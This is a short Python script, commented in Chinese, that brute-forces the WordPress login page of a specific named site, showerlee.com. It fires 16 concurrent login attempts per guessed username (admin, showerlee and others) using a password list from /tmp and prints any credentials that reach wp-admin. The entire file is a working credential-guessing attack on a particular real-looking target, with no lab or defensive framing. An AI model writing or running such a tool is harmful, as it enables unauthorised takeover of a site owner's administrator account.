#!/usr/bin/env python3
"""showerlee wp-login 多进程暴力 (16并发)"""
import urllib.request, http.cookiejar, sys
from concurrent.futures import ThreadPoolExecutor

URL = "http://showerlee.com/wp-login.php"
FOUND = None

def try_one(user, pwd):
    global FOUND
    if FOUND: return
    try:
        cj = http.cookiejar.CookieJar()
        op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        op.addheaders = [("User-Agent", "Mozilla/5.0")]
        op.open(URL, timeout=5)
        data = f"log={user}&pwd={pwd}&wp-submit=Log+In&redirect_to=http%3A%2F%2Fshowerlee.com%2Fwp-admin%2F&testcookie=1".encode()
        r = op.open(urllib.request.Request(URL, data=data), timeout=7)
        r.read()
        url = r.geturl()
        if "wp-admin" in url and "reauth" not in url:
            print(f"!!! HIT {user}/{pwd}", flush=True)
            FOUND = (user, pwd)
            return
    except Exception as e:
        if hasattr(e, "url") and "wp-admin" in str(e.url) and "reauth" not in str(e.url):
            print(f"!!! HIT {user}/{pwd} url={e.url}", flush=True)
            FOUND = (user, pwd)

def main():
    global FOUND
    users = sys.argv[2].split(",") if len(sys.argv) > 2 else ["admin","showerlee","sl","lzyadmin"]
    pwds = [l.strip() for l in open("/tmp/sl_pass.txt") if l.strip()]
    print(f"users={users} pwds={len(pwds)}", flush=True)
    with ThreadPoolExecutor(16) as ex:
        for user in users:
            if FOUND: break
            print(f"--- {user} ---", flush=True)
            futs = [ex.submit(try_one, user, p) for p in pwds]
            for f in futs:
                f.result()
                if FOUND: break
            if FOUND: break
    if FOUND:
        print(f"RESULT: {FOUND}", flush=True)
    else:
        print("NO HIT", flush=True)

if __name__ == "__main__":
    main()
